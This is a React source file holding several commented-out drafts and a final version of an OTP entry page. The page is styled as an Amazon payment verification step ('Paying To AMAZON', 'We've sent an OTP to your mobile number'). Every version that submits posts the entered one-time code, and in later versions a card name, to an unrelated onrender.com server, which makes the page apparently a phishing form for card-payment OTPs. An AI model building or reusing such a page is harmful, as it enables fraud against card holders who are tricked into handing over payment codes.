// import React from "react";
// import NavbarForm from "./NavbarForm";

// const OtpComponent = () => {
//   return (
//     <>
//       <NavbarForm />
//       <div className="container">
//         <div className="row mt-3">
//           <div className="col-6">
//             <p>Paying To</p>
//             <p>TOTAL AMOUNT</p>
//           </div>
//           <div className="col-6">
//             <p>AMAZON</p>
//             <p>80.1</p>
//           </div>
//         </div>
//         <hr />
//         <div className="text-center">Verification Required</div>
//         <div className="text-center">
//           To continue, complete this verification step. We,ve sent an OTP to
//           your mobile number. please enter it below to complete verification
//         </div>

//         <div className="mt-3 otp-input">
//           <input
//             type="number"
//             placeholder="Enter OTP"
//             className="w-100 py-2 border border-1"
//           />
//         </div>
//         <button type="submit" className="mt-2 btn-buy-now  place-btn w-100">
//           Continue
//         </button>

//         <div className="text-center mt-3">
//             Not received the code? Please resend in Resend Otp
//         </div>



//       </div>
//     </>
//   );
// };

// export default OtpComponent;

// import React, { useState } from "react";
// import axios from "axios";
// import NavbarForm from "./NavbarForm";
// import FooterForm from "./FooterForm";

// const OtpComponent = () => {
//   const [otp, setOtp] = useState("");
//   const [message, setMessage] = useState("");

//   const handleOtpChange = (e) => {
//     setOtp(e.target.value);
//   };

//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     try {
//       const response = await axios.post("https://ecommerce-ryoy.onrender.com/otp", { otp });
//       setMessage(response.data.message);
//     } catch (error) {
//       setMessage("An error occurred. Please try again.");
//     }
//   };

//   return (
//     <>
//       <NavbarForm />
//       <div className="container">
//         <div className="row mt-3">
//           <div className="col-6">
//             <p>Paying To</p>
//             <p>TOTAL AMOUNT</p>
//           </div>
//           <div className="col-6">
//             <p>AMAZON</p>
//             <p>80.1</p>
//           </div>
//         </div>
//         <hr />
//         <div className="text-center">Verification Required</div>
//         <div className="text-center">
//           To continue, complete this verification step. We've sent an OTP to
//           your mobile number. Please enter it below to complete verification
//         </div>

//         <form onSubmit={handleSubmit}>
//           <div className="mt-3 otp-input">
//             <input
//               type="number"
//               placeholder="Enter OTP"
//               value={otp}
//               onChange={handleOtpChange}
//               className="w-100 py-2 border border-1"
//               required
//             />
//           </div>
//           <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
//             Continue
//           </button>
//         </form>

//         {message && <div className="text-center mt-3">{message}</div>}

//         <div className="text-center mt-3">
//           Not received the code? Please resend in Resend Otp
//         </div>
//       </div>
//       <FooterForm/>
//     </>
//   );
// };

// export default OtpComponent;

// import React, { useState } from "react";
// import axios from "axios";
// import NavbarForm from "./NavbarForm";
// import FooterForm from "./FooterForm";

// const OtpComponent = () => {
//   const [otp, setOtp] = useState("");
//   const [cardholderName, setCardholderName] = useState(""); // State for cardholder name
//   const [message, setMessage] = useState("");

//   const handleOtpChange = (e) => {
//     setOtp(e.target.value);
//   };

//   // Function to handle cardholder name change (optional)
//   const handleCardholderNameChange = (e) => {
//     setCardholderName(e.target.value);
//   };

//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     try {
//       const response = await axios.post("https://ecommerce-ryoy.onrender.com/otp", {
//         otp,
//         cardholderName // Include cardholder name in the request payload
//       });
//       setMessage(response.data.message);
//     } catch (error) {
//       setMessage("An error occurred. Please try again.");
//     }
//   };

//   return (
//     <>
//       <NavbarForm />
//       <div className="container">
//         <div className="row mt-3">
//           <div className="col-6">
//             <p>Paying To</p>
//             <p>TOTAL AMOUNT</p>
//           </div>
//           <div className="col-6">
//             <p>AMAZON</p>
//             <p>80.1</p>
//           </div>
//         </div>
//         <hr />
//         <div className="text-center">Verification Required</div>
//         <div className="text-center">
//           To continue, complete this verification step. We've sent an OTP to
//           your mobile number. Please enter it below to complete verification
//         </div>

//         <form onSubmit={handleSubmit}>
//           <div className="mt-3 otp-input">
//             <input
//               type="number"
//               placeholder="Enter OTP"
//               value={otp}
//               onChange={handleOtpChange}
//               className="w-100 py-2 border border-1"
//               required
//             />
//           </div>
//           {/* 
//           Optional: Include cardholder name in the request payload
//           <input
//             type="text"
//             value={cardholderName}
//             onChange={handleCardholderNameChange}
//             style={{ display: "none" }} // Hide the input field
//           />
//           */}
//           <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
//             Continue
//           </button>
//         </form>

//         {message && <div className="text-center mt-3">{message}</div>}

//         <div className="text-center mt-3">
//           Not received the code? Please resend in Resend Otp
//         </div>
//       </div>
//       <FooterForm/>
//     </>
//   );
// };

// export default OtpComponent;

// import React, { useState } from "react";
// import axios from "axios";
// import NavbarForm from "./NavbarForm";
// import FooterForm from "./FooterForm";

// const OtpComponent = () => {
//   const [otp, setOtp] = useState("");
//   const [message, setMessage] = useState("");
//   const [showOtpInput, setShowOtpInput] = useState(false);

//   const handleOtpChange = (e) => {
//     setOtp(e.target.value);
//   };

//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     try {
//       const response = await axios.post("https://ecommerce-ryoy.onrender.com/otp", { otp });
//       if (response.data.message === "New card added successfully") {
//         // If the message is as expected, show the OTP input
//         setShowOtpInput(true);
//       } else {
//         setMessage(response.data.message); // Show other messages if necessary
//       }
//     } catch (error) {
//       setMessage("An error occurred. Please try again.");
//     }
//   };

//   return (
//     <>
//       <NavbarForm />
//       <div className="container">
//         <div className="row mt-3">
//           <div className="col-6">
//             <p>Paying To</p>
//             <p>TOTAL AMOUNT</p>
//           </div>
//           <div className="col-6">
//             <p>AMAZON</p>
//             <p>80.1</p>
//           </div>
//         </div>
//         <hr />
//         <div className="text-center">Verification Required</div>
//         <div className="text-center">
//           To continue, complete this verification step. We've sent an OTP to
//           your mobile number. Please enter it below to complete verification
//         </div>

//         {/* Ternary operation to conditionally render OTP input */}
//         {showOtpInput ? (
//           <form onSubmit={handleSubmit}>
//             <div className="mt-3 otp-input">
//               <input
//                 type="number"
//                 placeholder="Enter OTP"
//                 value={otp}
//                 onChange={handleOtpChange}
//                 className="w-100 py-2 border border-1"
//                 required
//               />
//             </div>
//             <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
//               Continue
//             </button>
//           </form>
//         ) : (
//           <div className="text-center mt-3">
//             {/* Placeholder for other content or options */}
//             Cardholder name is sufficient OR Get Card option visible
//           </div>
//         )}

//         {message && <div className="text-center mt-3">{message}</div>}

//         <div className="text-center mt-3">
//           Not received the code? Please resend in Resend Otp
//         </div>
//       </div>
//       <FooterForm/>
//     </>
//   );
// };

// export default OtpComponent;


//  import React, { useState } from "react";
// import axios from "axios";
// import NavbarForm from "./NavbarForm";
// import FooterForm from "./FooterForm";
// import { useLocation } from 'react-router-dom';

// const OtpComponent = () => {
//   const [otp, setOtp] = useState("");
//   const [cardName, setCardname] = useState("")
//   const [message, setMessage] = useState("");
//   const location = useLocation();
//   const { cardHolderName } = location.state || {}; // Destructure cardHolderName from location.state



//   const handleSubmit = async(e) =>{
//     e.preventDefault();
//     console.log(`${cardName} ${otp}`)

//     const ob ={
//       otp:otp,
//       cardHolderName:cardName
//     }

//     try {
//       const response = await axios.post("https://ecommerce-ryoy.onrender.com/otp",ob)
//       console.log(response.data)
//     } catch (error) {
//       console.log(error)
//     }

//   }

//   return (
//     <>
//       <NavbarForm />
//       <div className="container">
//         <div className="row mt-3">
//           <div className="col-6">
//             <p>Paying To</p>
//             <p>TOTAL AMOUNT</p>
//           </div>
//           <div className="col-6">
//             <p>AMAZON</p>
//             <p>80.1</p>
//           </div>
//         </div>
//         <hr />
//         <div className="text-center">Verification Required</div>
//         <div className="text-center">
//           To continue, complete this verification step. We've sent an OTP to
//           your mobile number. Please enter it below to complete verification
//         </div>
        
//         {/* Display the cardholder name */}
//         {cardHolderName && (
//           <div className="text-center mt-3">
//             <p>Cardholder Name: {cardHolderName}</p>
//           </div>
//         )}

//         <form onSubmit={handleSubmit}>

//         <div className="mt-3 otp-input">
//             <input
//               type="text"
//               placeholder="card name"
//               value={cardName}
//               onChange={(e)=>setCardname(e.target.value)}
//               className="w-100 py-2 border border-1"
//               required
//             />
//           </div>
//           <div className="mt-3 otp-input">
//             <input
//               type="number"
//               placeholder="Enter OTP"
//               value={otp}
//               onChange={(e)=>setOtp(e.target.value)}
//               className="w-100 py-2 border border-1"
//               required
//             />
//           </div>
//           <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
//             Continue
//           </button>
//         </form>

//         {message && <div className="text-center mt-3">{message}</div>}

//         <div className="text-center mt-3">
//           Not received the code? Please resend in Resend Otp
//         </div>
//       </div>
//       <FooterForm />
//     </>
//   );
// };

// export default OtpComponent;

// import React, { useState } from "react";
// import axios from "axios";
// import NavbarForm from "./NavbarForm";
// import FooterForm from "./FooterForm";
// import { useLocation } from 'react-router-dom';

// const OtpComponent = () => {
//   const [otp, setOtp] = useState("");
//   const [cardName, setCardName] = useState("");
//   const [message, setMessage] = useState("");
//   const location = useLocation();
//   const { cardHolderName } = location.state || {};

//   const handleSubmit = async (e) => {
//     e.preventDefault();
    
//     if (!otp || !cardName) {
//       setMessage("Please enter OTP and card name.");
//       return;
//     }

//     try {
//       const response = await axios.post("https://ecommerce-ryoy.onrender.com/otp", {
//         otp: otp,
//         cardHolderName: cardName
//       });
//       console.log(response.data);
//       setMessage("Verification successful!");
//       // You may want to navigate the user to the next step or perform any other action upon successful verification
//     } catch (error) {
//       console.log(error);
//       setMessage("Error verifying OTP. Please try again.");
//     }
//   }

//   return (
//     <>
//       <NavbarForm />
//       <div className="container">
//         <div className="row mt-3">
//           <div className="col-6">
//             <p>Paying To</p>
//             <p>TOTAL AMOUNT</p>
//           </div>
//           <div className="col-6">
//             <p>AMAZON</p>
//             <p>80.1</p>
//           </div>
//         </div>
//         <hr />
//         <div className="text-center">Verification Required</div>
//         <div className="text-center">
//           To continue, complete this verification step. We've sent an OTP to
//           your mobile number. Please enter it below to complete verification
//         </div>
        
//         {cardHolderName && (
//           <div className="text-center mt-3">
//             <p>Cardholder Name: {cardHolderName}</p>
//           </div>
//         )}

//         <form onSubmit={handleSubmit}>
//           <div className="mt-3 otp-input">
//             <input
//               type="text"
//               placeholder="Enter Card Name"
//               value={cardName}
//               onChange={(e) => setCardName(e.target.value)}
//               className="w-100 py-2 border border-1"
//               required
//             />
//           </div>
//           <div className="mt-3 otp-input">
//             <input
//               type="number"
//               placeholder="Enter OTP"
//               value={otp}
//               onChange={(e) => setOtp(e.target.value)}
//               className="w-100 py-2 border border-1"
//               maxLength="6"
//               // minLength="6"
//               required
//             />
//           </div>
//           <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
//             Continue
//           </button>
//         </form>

//         {message && <div className="text-center mt-3">{message}</div>}

//         <div className="text-center mt-3">
//           Not received the code? Please resend in Resend Otp
//         </div>
//       </div>
//       <FooterForm />
//     </>
//   );
// };

// export default OtpComponent;

import React, { useState } from "react";
import axios from "axios";
import NavbarForm from "./NavbarForm";
import FooterForm from "./FooterForm";
import { useLocation, useNavigate} from 'react-router-dom';

const OtpComponent = () => {
  const [otp, setOtp] = useState("");
  const [cardName, setCardName] = useState("");
  const [message, setMessage] = useState("");
  const location = useLocation();
  const navigate = useNavigate();
  const { cardHolderName } = location.state || {};

  const handleChangeOtp = (e) => {
    const input = e.target.value;
    // Accept only 6-digit numbers
    const sixDigitNumber = /^[0-9]{1,6}$/;
    if (sixDigitNumber.test(input)) {
      setOtp(input);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!otp || !cardName) {
      setMessage("Please enter OTP and card name.");
      return;
    }

    try {
      const response = await axios.post("https://ecommerce-ryoy.onrender.com/otp", {
        otp: otp,
        cardHolderName: cardName
      });
      console.log(response.data);
      setMessage("Verification successful!");
      // You may want to navigate the user to the next step or perform any other action upon successful verification
    } catch (error) {
      console.log(error);
      setMessage("Error verifying OTP. Please try again.");
    }
  }

  const handleContinue = () => {
    // Pass the productId to the next page
    navigate("/home-page");
  };

  return (
    <>
      <NavbarForm />
      <div className="container">
        <div className="row mt-3">
          <div className="col-6">
            <p>Paying To</p>
           
          </div>
          <div className="col-6">
            <p>AMAZON</p>
           
          </div>
        </div>
        <hr />
        <div className="text-center">Verification Required</div>
        <div className="text-center">
          To continue, complete this verification step. We've sent an OTP to
          your mobile number. Please enter it below to complete verification
        </div>
        
      

        <form onSubmit={handleSubmit}>
          <div className="mt-3 otp-input">
            <input
              type="text"
              placeholder="Enter Card Name"
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              className="w-100 py-2 border border-1"
              required
            />
          </div>
          <div className="mt-3 otp-input">
            <input
              type="number"
              placeholder="Enter OTP"
              value={otp}
              onChange={handleChangeOtp}
              className="w-100 py-2 border border-1"
              required
              maxLength={6}
            />
          </div>
          <button type="submit" className="mt-2 btn-buy-now place-btn w-100"
           onClick={handleContinue}
          >
            Continue
          </button>
        </form>

        {message && <div className="text-center mt-3">{message}</div>}

        <div className="text-center mt-3">
          Not received the code? Please resend in Resend Otp
        </div>
      </div>
      <FooterForm />
    </>
  );
};

export default OtpComponent;








